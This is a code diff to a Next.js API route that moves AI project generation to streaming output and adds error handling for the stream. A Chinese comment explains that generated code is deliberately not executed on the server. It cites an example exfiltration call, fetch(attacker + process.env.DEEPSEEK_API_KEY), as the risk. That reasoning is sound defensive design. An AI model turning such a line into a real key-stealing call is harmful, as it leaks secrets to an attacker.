@@ -1,10 +1,11 @@
 import type { NextApiRequest, NextApiResponse } from 'next';
 import {
+  abortSignalFor,
   AIProviderConfig,
-  callAI,
   ChatMessage,
   extractJson,
   NoProviderError,
+  streamStructured,
 } from '../../src/lib/server/aiProvider';
 import { coerceProject, validateProjectShape } from '../../src/lib/engineering/validateProject';
 import { addUserProject } from '../../src/lib/server/projectStore';
@@ -203,35 +204,45 @@ Remember: reference implementations must actually pass the specs, latency number
       );
     }
 
-    const raw = await callAI(messages, aiConfig, {
+    // 一份工程题动辄几万字，等它写完再显示等于让用户对着转圈发呆好几分钟
+    await streamStructured(res, messages, aiConfig, {
       temperature: previous ? 0.3 : 0.6,
       maxTokens: 16000,
+      signal: abortSignalFor(res),
+      onComplete: (raw) => {
+        const project = coerceProject(extractJson<any>(raw));
+        const structuralProblems = validateProjectShape(project);
+
+        /**
+         * 这里**只做结构校验**，不执行任何生成出来的代码。
+         *
+         * 真跑一遍是必要的（模型经常写出自己都过不了的参考实现），但那必须发生在
+         * 浏览器的 Web Worker 里：它有独立的全局环境，看不到 process.env，也能被
+         * terminate。放在这个 API 进程里跑，一个同步死循环就能让整个服务不再响应，
+         * 而一句 fetch(attacker + process.env.DEEPSEEK_API_KEY) 就能把 key 带走。
+         */
+        const payload: GenerateResponsePayload = {
+          success: true,
+          project,
+          problems: structuralProblems.length > 0 ? structuralProblems : undefined,
+          saved: false,
+        };
+        return payload;
+      },
     });
-    const project = coerceProject(extractJson<any>(raw));
-    const structuralProblems = validateProjectShape(project);
-
-    /**
-     * 这里**只做结构校验**，不执行任何生成出来的代码。
-     *
-     * 真跑一遍是必要的（模型经常写出自己都过不了的参考实现），但那必须发生在
-     * 浏览器的 Web Worker 里：它有独立的全局环境，看不到 process.env，也能被
-     * terminate。放在这个 API 进程里跑，一个同步死循环就能让整个服务不再响应，
-     * 而一句 fetch(attacker + process.env.DEEPSEEK_API_KEY) 就能把 key 带走。
-     */
-    const payload: GenerateResponsePayload = {
-      success: true,
-      project,
-      problems: structuralProblems.length > 0 ? structuralProblems : undefined,
-      saved: false,
-    };
-
-    return res.status(200).json(payload);
   } catch (error) {
     console.error('Generate project error:', error);
     const message =
       error instanceof NoProviderError
         ? error.message
         : (error as Error).message || 'Failed to generate project';
+    // 流开始之后状态码已经定死，错误只能走事件
+    if (res.headersSent) {
+      res.write(`data: ${JSON.stringify({ type: 'error', message })}\n\n`);
+      res.write(`data: ${JSON.stringify({ type: 'done' })}\n\n`);
+      res.end();
+      return;
+    }
     return res.status(500).json({ error: message });
   }
 }
